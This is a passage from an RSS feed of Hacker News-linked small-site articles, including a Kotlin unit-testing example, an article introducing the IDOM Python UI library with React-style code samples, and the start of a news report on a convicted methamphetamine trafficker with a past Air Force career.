</code></pre></div><p>With some creative use of the <code>?:</code> elvis operator and the <code>also</code> scope function we can make it a one liner, but it‚Äôs definitely in need of some actual tests to prove this works correctly.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>ItemRepositoryTests</span> {

  <span>@Mock</span> <span>private</span> <span>lateinit</span> <span>var</span> api: ItemApi
  <span>@Mock</span> <span>private</span> <span>lateinit</span> <span>var</span> cache: ItemCache
  
  <span>private</span> <span>lateinit</span> <span>var</span> repo: ItemRepository

  <span>@Before</span> <span>fun</span> <span>setUp</span>() {
    repo = ItemRepository(api, cache)
  }

  <span>@Test</span> <span>fun</span> <span>`findAll should return items from API and store in cache when not cached`</span>() {
    <span>val</span> itemList = listOf(item1, item2)
    every { api.all() } returns itemList
    every { cache.all() } returns <span>null</span>

    <span>val</span> result = repo.findAll()

    assertSame(itemList, result)

    verifySequence {
      cache.all()
      api.all()
      cache.putAll(itemList)
    }
  }

  <span>@Test</span> <span>fun</span> <span>`findAll should return items from cache when already cached`</span>() {
    <span>val</span> itemList = listOf(item1, item2)
    <span>val</span> cachedItemList = listOf(cachedItem1, cachedItem2)
    every { api.all() } returns itemList
    every { cache.all() } returns cachedItemList

   ‚Ä¶</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://robholmes.app/posts/unit-testing-as-a-first-class-citizen/">https://robholmes.app/posts/unit-testing-as-a-first-class-citizen/</a></em></p>]]>
            </description>
            <link>https://robholmes.app/posts/unit-testing-as-a-first-class-citizen/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26199330</guid>
            <pubDate>Fri, 19 Feb 2021 23:15:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Free and Safe Bookmarking Tool]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26199099">thread link</a>) | @totaldude87
<br/>
February 19, 2021 | https://booky.io/about | <a href="https://web.archive.org/web/*/https://booky.io/about">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header id="loading__header"><div><p><span>‚Äå</span></p><nav><span>‚Äå </span><span>‚Äå</span></nav><p><span>‚Äå </span><span>‚Äå</span></p></div></header><span id="loading__spinner"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M24 12c-0.030-1.567-0.37-3.129-0.998-4.558-0.626-1.43-1.534-2.725-2.649-3.795s-2.436-1.918-3.867-2.476c-1.43-0.561-2.967-0.829-4.486-0.796-1.519 0.030-3.031 0.36-4.414 0.969-1.384 0.607-2.638 1.488-3.673 2.568s-1.855 2.36-2.395 3.745c-0.542 1.384-0.8 2.872-0.767 4.342 0.030 1.471 0.351 2.933 0.941 4.27 0.588 1.338 1.441 2.551 2.487 3.552s2.284 1.793 3.624 2.314c1.339 0.523 2.776 0.771 4.199 0.739 1.423-0.030 2.835-0.341 4.127-0.912 1.293-0.569 2.464-1.394 3.43-2.406s1.731-2.209 2.233-3.502c0.305-0.784 0.513-1.603 0.622-2.433 0.029 0.002 0.059 0.003 0.088 0.003 0.828 0 1.5-0.672 1.5-1.5 0-0.042-0.002-0.084-0.006-0.125h0.006zM21.617 15.983c-0.55 1.247-1.347 2.377-2.324 3.309s-2.133 1.668-3.381 2.151c-1.248 0.485-2.585 0.714-3.911 0.682-1.327-0.030-2.639-0.322-3.84-0.855-1.201-0.531-2.289-1.301-3.187-2.243s-1.606-2.057-2.070-3.259c-0.466-1.202-0.685-2.489-0.653-3.768 0.031-1.279 0.312-2.541 0.826-3.696 0.512-1.155 1.254-2.202 2.162-3.066s1.981-1.544 3.138-1.989c1.156-0.447 2.394-0.656 3.624-0.624 1.23 0.031 2.443 0.303 3.552 0.798 1.11 0.493 2.115 1.207 2.944 2.081s1.481 1.905 1.908 3.016c0.428 1.111 0.628 2.298 0.596 3.48h0.006c-0.003 0.041-0.006 0.083-0.006 0.125 0 0.774 0.586 1.41 1.338 1.491-0.146 0.816-0.387 1.613-0.721 2.367z"></path></svg></span></div>]]>
            </description>
            <link>https://booky.io/about</link>
            <guid isPermaLink="false">hacker-news-small-sites-26199099</guid>
            <pubDate>Fri, 19 Feb 2021 22:52:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IDOM ‚Äì It's React, but in Python]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26199008">thread link</a>) | @xdze2
<br/>
February 19, 2021 | https://rmorshea.github.io/articles/2021/idom-react-but-its-python/article/ | <a href="https://web.archive.org/web/*/https://rmorshea.github.io/articles/2021/idom-react-but-its-python/article/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-md-component="container">
      
      
        
      
      <main data-md-component="main">
        <div>
          
            
              
            
            
              
            
          
          <div>
            <article><a download="" href="https://rmorshea.github.io/articles/2021/idom-react-but-its-python/article/article.pdf" title="PDF Export"><svg style="height: 1.2rem; width: 1.2rem;" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M224 136V0H24C10.7 0 0 10.7 0 24v464c0 13.3 10.7 24 24 24h336c13.3 0 24-10.7 24-24V160H248c-13.2 0-24-10.8-24-24zm76.45 211.36l-96.42 95.7c-6.65 6.61-17.39 6.61-24.04 0l-96.42-95.7C73.42 337.29 80.54 320 94.82 320H160v-80c0-8.84 7.16-16 16-16h32c8.84 0 16 7.16 16 16v80h65.18c14.28 0 21.4 17.29 11.27 27.36zM377 105L279.1 7c-4.5-4.5-10.6-7-17-7H256v128h128v-6.1c0-6.3-2.5-12.4-7-16.9z"></path></svg></a>
              
                
                
                
<p><a href="https://github.com/idom-team/idom" target="_blank">IDOM</a> is a new declarative Python
package for building highly interactive user interfaces.</p>
<ul>
<li><a href="https://github.com/idom-team/idom"><span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></span> https://github.com/idom-team/idom</a></li>
<li><a href="https://idom-docs.herokuapp.com/"><span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M448 360V24c0-13.3-10.7-24-24-24H96C43 0 0 43 0 96v320c0 53 43 96 96 96h328c13.3 0 24-10.7 24-24v-16c0-7.5-3.5-14.3-8.9-18.7-4.2-15.4-4.2-59.3 0-74.7 5.4-4.3 8.9-11.1 8.9-18.6zM128 134c0-3.3 2.7-6 6-6h212c3.3 0 6 2.7 6 6v20c0 3.3-2.7 6-6 6H134c-3.3 0-6-2.7-6-6v-20zm0 64c0-3.3 2.7-6 6-6h212c3.3 0 6 2.7 6 6v20c0 3.3-2.7 6-6 6H134c-3.3 0-6-2.7-6-6v-20zm253.4 250H96c-17.7 0-32-14.3-32-32 0-17.6 14.4-32 32-32h285.4c-1.9 17.1-1.9 46.9 0 64z"></path></svg></span> https://idom-docs.herokuapp.com</a></li>
<li><a href="https://github.com/idom-team/idom/discussions"><span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zM262.655 90c-54.497 0-89.255 22.957-116.549 63.758-3.536 5.286-2.353 12.415 2.715 16.258l34.699 26.31c5.205 3.947 12.621 3.008 16.665-2.122 17.864-22.658 30.113-35.797 57.303-35.797 20.429 0 45.698 13.148 45.698 32.958 0 14.976-12.363 22.667-32.534 33.976C247.128 238.528 216 254.941 216 296v4c0 6.627 5.373 12 12 12h56c6.627 0 12-5.373 12-12v-1.333c0-28.462 83.186-29.647 83.186-106.667 0-58.002-60.165-102-116.531-102zM256 338c-25.365 0-46 20.635-46 46 0 25.364 20.635 46 46 46s46-20.636 46-46c0-25.365-20.635-46-46-46z"></path></svg></span> https://github.com/idom-team/idom/discussions</a></li>
</ul>
<p><a href="https://github.com/idom-team/idom"><img alt="idom logo" src="https://github.com/idom-team/idom/raw/929d07ff4a643320a6148336613621242284f8d2/docs/source/branding/idom-logo.png"></a></p>
<p>IDOM takes inspiration from <a href="https://reactjs.org/" target="_blank">React</a>, and wherever
possible, attempts to achieve parity with the features it copies more directly. Nowhere
is this more evident than the version of React's often lauded
<a href="https://reactjs.org/docs/hooks-intro.html" target="_blank">"Hooks"</a> that IDOM
implements in Python.</p>
<p>At a glance, the similarities between IDOM and React are rather striking. Below is a
React component which defines a simple <code>Counter</code> displaying the number of times a button
has been clicked:</p>
<div><pre><span></span><code><span>import</span> <span>React</span><span>,</span> <span>{</span> <span>useState</span> <span>}</span> <span>from</span> <span>"react"</span><span>;</span>
<span>import</span> <span>ReactDOM</span> <span>from</span> <span>"react-dom"</span><span>;</span>

<span>function</span> <span>Counter</span><span>()</span> <span>{</span>
  <span>const</span> <span>[</span><span>count</span><span>,</span> <span>setCount</span><span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>);</span>
  <span>return</span> <span>(</span>
    <span>&lt;</span><span>div</span><span>&gt;</span>
      <span>&lt;</span><span>button</span> <span>onClick</span><span>=</span><span>{()</span> <span>=&gt;</span> <span>setCount</span><span>(</span><span>count</span> <span>+</span> <span>1</span><span>)}&gt;</span><span>Click</span> <span>me</span><span>!</span><span>&lt;/</span><span>button</span><span>&gt;</span>
      <span>&lt;</span><span>p</span><span>&gt;{</span><span>`Click count: </span><span>${</span><span>count</span><span>}</span><span>`</span><span>}&lt;/</span><span>p</span><span>&gt;</span>
    <span>&lt;/</span><span>div</span><span>&gt;</span>
  <span>);</span>
<span>}</span>

<span>ReactDOM</span><span>.</span><span>render</span><span>(&lt;</span><span>Counter</span> <span>/&gt;,</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"root"</span><span>));</span>
</code></pre></div>

<p>And this is the same component implemented in Python using IDOM:</p>
<div><pre><span></span><code><span>import</span> <span>idom</span>

<span>@idom</span><span>.</span><span>component</span>
<span>def</span> <span>Counter</span><span>():</span>
    <span>count</span><span>,</span> <span>set_count</span> <span>=</span> <span>idom</span><span>.</span><span>hooks</span><span>.</span><span>use_state</span><span>(</span><span>0</span><span>)</span>
    <span>return</span> <span>idom</span><span>.</span><span>html</span><span>.</span><span>div</span><span>(</span>
        <span>idom</span><span>.</span><span>html</span><span>.</span><span>button</span><span>(</span>
            <span>{</span><span>"onClick"</span><span>:</span> <span>lambda</span> <span>event</span><span>:</span> <span>set_count</span><span>(</span><span>count</span> <span>+</span> <span>1</span><span>)},</span>
            <span>"Click me!"</span>
        <span>),</span>
        <span>idom</span><span>.</span><span>html</span><span>.</span><span>p</span><span>(</span><span>f</span><span>"Click count: </span><span>{</span><span>count</span><span>}</span><span>"</span><span>)</span>
    <span>)</span>

<span>idom</span><span>.</span><span>run</span><span>(</span><span>Counter</span><span>)</span>
</code></pre></div>

<p>Which, when displayed in your browser, should look something like this:</p>
<p><img alt="click-counter-example" src="https://rmorshea.github.io/articles/2021/idom-react-but-its-python/click-counter.gif"></p>
<h2 id="why-do-we-need-idom">Why Do We Need IDOM?</h2>
<p>Over the <a href="https://www.npmtrends.com/react-vs-angular-vs-vue" target="_blank">past 5
years</a> front-end
developers seem to have concluded that programs written with a
<a href="https://www.youtube.com/watch?v=yGh0bjzj4IQ" target="_blank">declarative</a> style or
framework tend to be easier to understand and maintain than those done imperatively. Put
more simply, mutable state in programs can quickly lead to unsustainable complexity.
This trend is largely evidenced by the
<a href="https://gist.github.com/tkrotoff/b1caa4c3a185629299ec234d2314e190" target="_blank">rise</a>
of Javascript frameworks like <a href="https://vuejs.org/" target="_blank">Vue</a> and
<a href="https://reactjs.org/" target="_blank">React</a> which describe the logic of computations
without explicitly stating their control flow.</p>
<p><img alt="npm download trends" src="https://rmorshea.github.io/articles/2021/idom-react-but-its-python/npm-download-trends.png"></p>
<p>So what does this have to do with Python and IDOM? Well, because browsers are the de
facto "operating system of the internet", even back-end languages like Python have had
to figure out clever ways to integrate with them. While standard
<a href="https://en.wikipedia.org/wiki/Representational_state_transfer">REST</a> APIs are well
suited to applications built using HTML templates, modern browser users expect a higher
degree of interactivity than this alone can achieve.</p>
<p>A variety of Python packages have since been created to help solve this problem:</p>
<ul>
<li><a href="https://github.com/jupyter-widgets/ipywidgets" target="_blank">IPyWidgets</a> - Adds
  interactive widgets to <a href="https://jupyter.org/" target="_blank">Jupyter Notebooks</a></li>
<li><a href="https://plotly.com/dash/" target="_blank">Dash</a> - Allows data scientists to produces
  enterprise-ready analytic apps</li>
<li><a href="https://www.streamlit.io/" target="_blank">Streamlit</a> - Turns simple Python scripts
  into interactive dashboards</li>
<li><a href="https://docs.bokeh.org/" target="_blank">Bokeh</a> - An interactive visualization
  library for modern web browsers</li>
</ul>
<p>However they each have drawbacks that can make them difficult to use.</p>
<ol>
<li>
<p><strong>Restrictive ecosystems</strong> - UI components developed for one framework cannot be
   easily ported to any of the others because their APIs are either too complex,
   undocumented, or are structurally inaccesible.</p>
</li>
<li>
<p><strong>Imperative paradigm</strong> - IPyWidgets and Bokeh have not embraced the same declarative
   design principles pioneered by front-end developers. Streamlit and Dash on the
   otherhand, are declarative, but fall short of the features provided by React or Vue.</p>
</li>
<li>
<p><strong>Limited layouts</strong> - At their initial inception, the developers of these libraries
   were driven by the visualization needs of data scientists so the ability to create
   complex UI layouts may not have been a primary engineering goal.</p>
</li>
</ol>
<p>A future article will address specific comparisons to each of the projects mentioned
above, but for now, we'll just focus on IDOM and its solutions to these problems.</p>
<h2 id="ecosystem-independence">Ecosystem Independence</h2>
<p>IDOM has a flexible set of core abstractions that allow it to interface with its peers.
At the time of writing, both Jupyter and Dash are supported, while Streamlit and Bokeh
are in the works:</p>
<ul>
<li><a href="https://github.com/idom-team/idom-jupyter" target="_blank">idom-jupyter</a> (try it now
  with
  <a href="https://mybinder.org/v2/gh/idom-team/idom-jupyter/main?filepath=notebooks%2Fintroduction.ipynb" target="_blank">Binder</a>)</li>
<li><a href="https://github.com/idom-team/idom-dash" target="_blank">idom-dash</a></li>
</ul>
<p>By providing well defined interfaces and straighforward protocols, IDOM makes it easy to
swap out any part of the stack with an alternate implementation if you want to. For
example, if you need a different web server for your application, IDOM already has 3
options to choose from or, use as blueprints to create your own:</p>
<ul>
<li><a href="https://github.com/sanic-org/sanic" target="_blank">Sanic</a></li>
<li><a href="https://github.com/pallets/flask" target="_blank">Flask</a></li>
<li><a href="https://github.com/tornadoweb/tornado" target="_blank">Tornado</a></li>
</ul>
<p>You can even target your usage of IDOM in your production-grade applications with IDOM's
Javascript <a href="https://github.com/idom-team/idom-client-react" target="_blank">React client library</a>. Just install
it in your front-end app and connect to a back-end websocket that's serving up IDOM
models. IDOM's own
<a href="https://idom-docs.herokuapp.com/docs/index.html" target="_blank">documentation</a> acts as
a prime example for this targeted usage - most of the page is static HTML, but embedded
in it are interactive examples that feature live views being served from a web socket:</p>
<p><img alt="live-examples-in-docs" src="https://rmorshea.github.io/articles/2021/idom-react-but-its-python/live-examples-in-docs.gif"></p>
<h2 id="declarative-components">Declarative Components</h2>
<p>IDOM, by adopting the hook design pattern from React, inherits many of its aesthetic and
functional characteristics. For those unfamiliar with hooks, user interfaces are
composed of basic <a href="https://en.wikipedia.org/wiki/HTML_element" target="_blank">HTML elements</a> that are
constructed and returned by special functions called "components". Then, through the
magic of hooks, those component functions can be made to have state. Consider the
component below which displays a basic representation of an
<a href="https://en.wikipedia.org/wiki/AND_gate" target="_blank">AND-gate</a>:</p>
<div><pre><span></span><code><span>import</span> <span>idom</span>

<span>@idom</span><span>.</span><span>component</span>
<span>def</span> <span>AndGate</span><span>():</span>
    <span>input_1</span><span>,</span> <span>toggle_1</span> <span>=</span> <span>use_toggle</span><span>()</span>
    <span>input_2</span><span>,</span> <span>toggle_2</span> <span>=</span> <span>use_toggle</span><span>()</span>
    <span>return</span> <span>idom</span><span>.</span><span>html</span><span>.</span><span>div</span><span>(</span>
        <span>idom</span><span>.</span><span>html</span><span>.</span><span>input</span><span>(</span>
            <span>{</span><span>"type"</span><span>:</span> <span>"checkbox"</span><span>,</span> <span>"onClick"</span><span>:</span> <span>lambda</span> <span>event</span><span>:</span> <span>toggle_1</span><span>()}</span>
        <span>),</span>
        <span>idom</span><span>.</span><span>html</span><span>.</span><span>input</span><span>(</span>
            <span>{</span><span>"type"</span><span>:</span> <span>"checkbox"</span><span>,</span> <span>"onClick"</span><span>:</span> <span>lambda</span> <span>event</span><span>:</span> <span>toggle_2</span><span>()}</span>
        <span>),</span>
        <span>idom</span><span>.</span><span>html</span><span>.</span><span>pre</span><span>(</span><span>f</span><span>"</span><span>{</span><span>input_1</span><span>}</span><span> AND </span><span>{</span><span>input_2</span><span>}</span><span> = </span><span>{</span><span>input_1</span> <span>and</span> <span>input_2</span><span>}</span><span>"</span><span>),</span>
    <span>)</span>

<span>def</span> <span>use_toggle</span><span>():</span>
    <span>state</span><span>,</span> <span>set_state</span> <span>=</span> <span>idom</span><span>.</span><span>hooks</span><span>.</span><span>use_state</span><span>(</span><span>False</span><span>)</span>

    <span>def</span> <span>toggle_state</span><span>():</span>
        <span>set_state</span><span>(</span><span>lambda</span> <span>old_state</span><span>:</span> <span>not</span> <span>old_state</span><span>)</span>

    <span>return</span> <span>state</span><span>,</span> <span>toggle_state</span>

<span>idom</span><span>.</span><span>run</span><span>(</span><span>AndGate</span><span>)</span>
</code></pre></div>

<p><img alt="and-gate-demo" src="https://rmorshea.github.io/articles/2021/idom-react-but-its-python/and-gate.gif"></p>
<p>Here's a very high level summary of how it works... the first time a view of the
component above is rendered, the <code>AndGate</code> function is called where its initial <code>state</code>
for <code>input_1</code> and <code>input_2</code> is <code>False</code>. The function then returns a series of HTML
elements with callbacks that respond to client-side events. Machinery behind the scenes
subsequently realizes that declaration and displays two checkbox buttons with the text
<code>False AND False = False</code>. Later, when a user clicks the now visible checkbox buttons,
client-side events are triggered, the associated callbacks respond by inverting the old
<code>state</code> from <code>False</code> to <code>True</code>, and a re-render of the component is scheduled. When
re-rendering, the function is again called, this time though, where <code>input_1</code> and
<code>input_2</code> have been updated to reflect the new <code>state</code>, thus causing the displayed text
to change.</p>
<p>In the code above, consider the fact that it never explicitely describes how to evolve
the frontend view when events occur. Instead, it declares that, given a particular
state, this is how the view should look. It's then IDOM's responsibility to figure out
how to bring that declaration into being. This behavior of defining outcomes without
stating the means by which to achieve them is what makes components in IDOM and React
"declarative". For comparison, a hypothetical, and a more imperative approach to
defining the same interface might look similar to the following:</p>
<div><pre><span></span><code><span>layout</span> <span>=</span> <span>Layout</span><span>()</span>

<span>def</span> <span>make_and_gate</span><span>():</span>
    <span>state</span> <span>=</span> <span>{</span><span>"input_1"</span><span>:</span> <span>False</span><span>,</span> <span>"input_2"</span><span>:</span> <span>False</span><span>}</span>
    <span>output_text</span> <span>=</span> <span>html</span><span>.</span><span>pre</span><span>()</span>
    <span>update_output_text</span><span>(</span><span>output_text</span><span>,</span> <span>state</span><span>)</span>

    <span>def</span> <span>toggle_input</span><span>(</span><span>index</span><span>):</span>
      <span>state</span><span>[</span><span>f</span><span>"input_</span><span>{</span><span>index</span><span>}</span><span>"</span><span>]</span> <span>=</span> <span>not</span> <span>state</span><span>[</span><span>f</span><span>"input_</span><span>{</span><span>index</span><span>}</span><span>"</span><span>]</span>
      <span>update_output_text</span><span>(</span><span>output_text</span><span>,</span> <span>state</span><span>)</span>

    <span>return</span> <span>html</span><span>.</span><span>div</span><span>(</span>
        <span>html</span><span>.</span><span>input</span><span>(</span>
            <span>{</span><span>"type"</span><span>:</span> <span>"checkbox"</span><span>,</span> <span>"onClick"</span><span>:</span> <span>lambda</span> <span>event</span><span>:</span> <span>toggle_input</span><span>(</span><span>1</span><span>)}</span>
        <span>),</span>
        <span>html</span><span>.</span><span>input</span><span>(</span>
            <span>{</span><span>"type"</span><span>:</span> <span>"checkbox"</span><span>,</span> <span>"onClick"</span><span>:</span> <span>lambda</span> <span>event</span><span>:</span> <span>toggle_input</span><span>(</span><span>2</span><span>)}</span>
        <span>),</span>
        <span>output_text</span>
    <span>)</span>

<span>def</span> <span>update_output_text</span><span>(</span><span>text</span><span>,</span> <span>state</span><span>):</span>
    <span>text</span><span>.</span><span>update</span><span>(</span>
        <span>children</span><span>=</span><span>"</span><span>{input_1}</span><span> AND </span><span>{input_2}</span><span> = </span><span>{output}</span><span>"</span><span>.</span><span>format</span><span>(</span>
            <span>input_1</span><span>=</span><span>state</span><span>[</span><span>"input_1"</span><span>],</span>
            <span>input_2</span><span>=</span><span>state</span><span>[</span><span>"input_2"</span><span>],</span>
            <span>output</span><span>=</span><span>state</span><span>[</span><span>"input_1"</span><span>]</span> <span>and</span> <span>state</span><span>[</span><span>"input_2"</span><span>],</span>
        <span>)</span>
    <span>)</span>

<span>layout</span><span>.</span><span>add_element</span><span>(</span><span>make_and_gate</span><span>())</span>
<span>layout</span><span>.</span><span>run</span><span>()</span>
</code></pre></div>

<p>In this imperative incarnation there are several disadvantages:</p>
<ol>
<li>
<p><strong>Refactoring is difficult</strong> - Functions are much more specialized to their
   particular usages in <code>make_and_gate</code> and thus cannot be easily generalized. By
   comparison, <code>use_toggle</code> from the declarative implementation could be applicable to
   any scenario where boolean indicators are toggled on and off.</p>
</li>
<li>
<p><strong>No clear static relations</strong> - There is no one section of code through which to
   discern the basic structure and behaviors of the view. This issue is exemplified by
   the fact that we must call <code>update_output_text</code> from two different locations. Once in
   the body of <code>make_and_gate</code> and again in the body of the callback <code>toggle_input</code>.
   This means that, to understand what the <code>output_text</code> might contain, we must also
   understand all the business logic that surrounds it.</p>
</li>
<li>
<p><strong>Referential links cause complexity</strong> - To evolve the view, various callbacks must
   hold references to all the elements that they will update. At the outset this makes
   writing programs difficult since elements must be passed up and down the call stack
   wherever they are needed. Considered further though, it also means that a function
   layers down in the call stack can accidentally or intentionally impact the behavior
   of ostensibly unrelated parts of the program.</p>
</li>
</ol>
<h2 id="virtual-document-object-model">Virtual Document Object Model</h2>
<p>To communicate between their back-end Python servers and Javascript clients, IDOM's
peers take an approach that aligns fairly closely with the
<a href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller" target="_blank">Model-View-Controller</a>
design pattern - the controller lives server-side (though not always), the model is
what's synchronized between the server and client, and the view is run client-side in</p></article></div></div></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rmorshea.github.io/articles/2021/idom-react-but-its-python/article/">https://rmorshea.github.io/articles/2021/idom-react-but-its-python/article/</a></em></p>]]>
            </description>
            <link>https://rmorshea.github.io/articles/2021/idom-react-but-its-python/article/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26199008</guid>
            <pubDate>Fri, 19 Feb 2021 22:43:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Meth Kingpin Was Director of Operations at US Air Force Combat Controller School]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26198555">thread link</a>) | @AndrewBissell
<br/>
February 19, 2021 | https://narco.news/meth-kingpin-was-director-of-operations-for-combat-controller-school | <a href="https://web.archive.org/web/*/https://narco.news/meth-kingpin-was-director-of-operations-for-combat-controller-school">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-6d96295c=""><div data-v-6d96295c=""><p>On the skydiving forum <em><a href="https://www.dropzone.com/forums/topic/222999-weekend-raeford-pics/?tab=comments#comment-439487">Dropzone</a></em>, a post from 2002 shows a picture of an individual identifiable as Tim Thacker along with his siblings. </p><figure><div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-11-at-12.35.02-PM-3.png" width="1214" height="1130"></p><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-16-at-4.59.19-PM-2.png" width="488" height="606"></p></div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-19-at-1.21.51-PM.png" width="1572" height="1252"></p><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-19-at-1.31.10-PM-2.png" width="1274" height="990"></p></div></div><figcaption><em><a href="https://www.linkedin.com/in/tim-thacker-8b173b71/">LinkedIn</a></em>;<em> <a href="https://www.facebook.com/PoliceWarsaw/posts/yesterday-may-11-2016-officers-with-the-warsaw-police-department-responded-to-a-/960425930732138/">Facebook</a></em>;<em> <a href="https://www.dropzone.com/forums/topic/222999-weekend-raeford-pics/?tab=comments#comment-439487">Dropzone</a> (<a href="https://web.archive.org/web/20210219184359/https://www.dropzone.com/forums/topic/222999-weekend-raeford-pics/">archived link</a>)</em></figcaption></figure><p>The user SkymonkeyONE identifies Tim Thacker as the subject and lists his username on the <em>Dropzone</em> forum: "USSkydiver". Curiously, the user USSkydiver identifies himself as "Tim Tennant" in several of his <a href="https://www.dropzone.com/profile/1794-usskydiver/content/page/3/?all_activity=1">posts</a>, including one from <a href="https://www.dropzone.com/forums/topic/184982-it's-my-last-day-at-work---and-i-am-not-sad!/">February 4, 2005</a>, in which he states that he will officially retire from the United States Air Force on April 1, 2005 after 25 years of active duty service.</p><figure><div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-19-at-1.30.33-PM.png" width="2176" height="732"></p></div></div><figcaption><a href="https://www.dropzone.com/forums/topic/184982-it's-my-last-day-at-work---and-i-am-not-sad!/?tab=comments#comment-86729">Link</a></figcaption></figure><p>In an <a href="https://www.socom.mil/TipOfTheSpear/June%202004%20Tip%20of%20the%20Spear.pdf">article</a> from the June 2004 issue of U.S. SOCOM's <em>Tip of the Spear</em>, a publication about the U.S. special operations forces (SOF), Master Sgt. Tim Tennant, United States Air Force, is listed as the Director of Operations for the USAF's Combat Controller School at Pope AFB, which is part of the Fort Bragg military complex near Fayetteville, NC. The USAF Combat Controllers (CCT) are an elite SOF unit that specialize in airborne warfare. According to a <a href="https://web.archive.org/web/20130628090639/http://www.af.mil/information/factsheets/factsheet.asp?id=174">fact sheet</a> published by the USAF about CCT:</p><blockquote>Air Force Special Operations Command's combat controllers, or CCT, are Battlefield Airmen assigned to special tactics squadrons. The CCT mission is to deploy undetected into combat and hostile environments to establish assault zones or airfields, while simultaneously conducting air traffic control, fire support, command and control, direct action, counter-terrorism, foreign internal defense, humanitarian assistance and special reconnaissance.</blockquote><figure><div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-19-at-1.07.40-PM-2.png" width="1008" height="1302"></p></div></div><figcaption><em><a href="https://www.socom.mil/TipOfTheSpear/June%202004%20Tip%20of%20the%20Spear.pdf">U.S. SOCOM</a></em></figcaption></figure><p>In August of 2019, Tim Thacker of Raeford, NC was sentenced to 40 years for his role in a large-scale, multi-state <a href="https://www.justice.gov/usao-ednc/pr/hoke-county-man-sentenced-forty-years-drug-distribution">methamphetamine distribution</a> conspiracy going back over a decade, which he ran out of the municipal airport, P K Airpark-5w4, owned by the Thacker family, the same airport implicated in a massive cocaine trafficking conspiracy in 1984. His father, Gene Paul Thacker, a former Green Beret and Vietnam War veteran, was acquitted essentially on the basis of his character despite "overwhelming" evidence implicating him, <a href="https://www.sun-sentinel.com/news/fl-xpm-1985-05-31-8501210917-story.html">according</a> to the prosecutor.</p><figure><div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-19-at-3.13.26-PM.png" width="1234" height="700"></p><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-19-at-3.12.41-PM.png" width="1234" 